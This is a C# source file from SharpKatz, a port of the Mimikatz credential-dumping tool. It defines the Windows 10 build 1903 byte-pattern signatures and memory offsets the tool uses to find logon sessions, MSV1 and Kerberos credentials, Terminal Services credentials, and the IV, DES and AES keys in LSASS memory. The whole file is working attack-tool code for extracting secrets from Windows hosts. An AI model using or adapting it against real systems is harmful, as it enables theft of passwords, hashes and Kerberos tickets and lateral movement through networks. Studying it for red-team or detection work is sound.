using SharpKatz.Module;
using System;
using System.Runtime.InteropServices;

namespace SharpKatz.WinBuild
{
    class WinBuild1903 : IWinBuild
    {
        public int build { get; set; }
        public Type PrimaryCredentialsType { get; set; }
        public Type PrimaryCredentialType { get; set; }
        public Type ListType { get; set; }
        public Type LogonSessionType { get; set; }
        public Type KerberosPrimaryCredentialType { get; set; }
        public Type TSCredType { get; set; }
        public Type KerberosLogonSessionType { get; set; }
        public Type KerberosHashType { get; set; }
        public int LOGONSESSIONLISTOFFSET { get; set; }
        public int LOGONSESSIONSLISTCOUNTOFFSET { get; set; }
        public byte[] logonSessionListSign { get; set; }
        public long IV_OFFSET { get; set; }
        public long DES_OFFSET { get; set; }
        public long AES_OFFSET { get; set; }
        public byte[] keyIVSig { get; set; }
        public byte[] logSessListSig { get; set; }
        public int ListTypeSize { get; set; }
        public int LogonSessionTypeSize { get; set; }
        public byte[] SspCredentialListSign { get; set; }
        public int CREDENTIALLISTOFFSET { get; set; }
        public byte[] LiveLocateLogonSession { get; set; }
        public int LIVESSPLISTOFFSET { get; set; }
        public byte[] KerbUnloadLogonSessionTableSign { get; set; }
        public int KerbUnloadLogonSessionTableOffset { get; set; }
        public byte[] TSGlobalCredTableSign { get; set; }
        public int TSGlobalCredTableOffset { get; set; }
        public int KerberosPrimaryCredentialTypeSize { get; set; }

        byte[] PTRN_WALL_TSGlobalCredTable = { 0x48, 0x83, 0xec, 0x20, 0x48, 0x8d, 0x0d };
        byte[] PTRN_WALL_KerbUnloadLogonSessionTable = {0x48, 0x8b, 0x18, 0x48, 0x8d, 0x0d};
        byte[] PTRN_WALL_LiveLocateLogonSession	= {0x74, 0x25, 0x8b};
        byte[] PTRN_WIN10_SspCredentialList = {0x24, 0x43, 0x72, 0x64, 0x41, 0xff, 0x15};
        byte[] PTRN_WIN6_PasswdSet = { 0x48, 0x3b, 0xd9, 0x74 };
        byte[] PTRN_WN6x_LogonSessionList = { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74 };
        byte[] keyIVSigAll = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };

        public WinBuild1903()
        {
            PrimaryCredentialsType = typeof(Msv1.KIWI_MSV1_0_PRIMARY_CREDENTIALS);
            PrimaryCredentialType = typeof(Msv1.MSV1_0_PRIMARY_CREDENTIAL_10_1607);
            ListType = typeof(Msv1.KIWI_MSV1_0_LIST_63);
            ListTypeSize = Marshal.SizeOf(typeof(Msv1.KIWI_MSV1_0_LIST_63));
            LogonSessionType = typeof(Kerberos.KIWI_KERBEROS_LOGON_SESSION_10_1607);
            LogonSessionTypeSize = Marshal.SizeOf(typeof(Kerberos.KIWI_KERBEROS_LOGON_SESSION_10_1607));
            KerberosPrimaryCredentialType = typeof(Kerberos.KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607);
            KerberosPrimaryCredentialTypeSize = Marshal.SizeOf(typeof(Kerberos.KIWI_KERBEROS_10_PRIMARY_CREDENTIAL_1607));
            TSCredType = typeof(Tspkg.KIWI_TS_CREDENTIAL_1607);

            KerberosLogonSessionType = typeof(Kerberos.KIWI_KERBEROS_LOGON_SESSION_10_1607);
            KerberosHashType = typeof(Kerberos.KERB_HASHPASSWORD_6_1607);

            build = OSVersionHelper.KULL_M_WIN_BUILD_10_1903;

            logonSessionListSign = PTRN_WN6x_LogonSessionList;

            LOGONSESSIONLISTOFFSET = 23;
            LOGONSESSIONSLISTCOUNTOFFSET = -4;

            keyIVSig = keyIVSigAll;

            IV_OFFSET = 67;
            DES_OFFSET = -89;
            AES_OFFSET = 16;

            logSessListSig = PTRN_WIN6_PasswdSet;

            SspCredentialListSign = PTRN_WIN10_SspCredentialList;

            CREDENTIALLISTOFFSET = 14;

            KerbUnloadLogonSessionTableSign = PTRN_WALL_KerbUnloadLogonSessionTable;
            KerbUnloadLogonSessionTableOffset = 6;

            TSGlobalCredTableSign = PTRN_WALL_TSGlobalCredTable;
            TSGlobalCredTableOffset = 7;
        }
    }
}
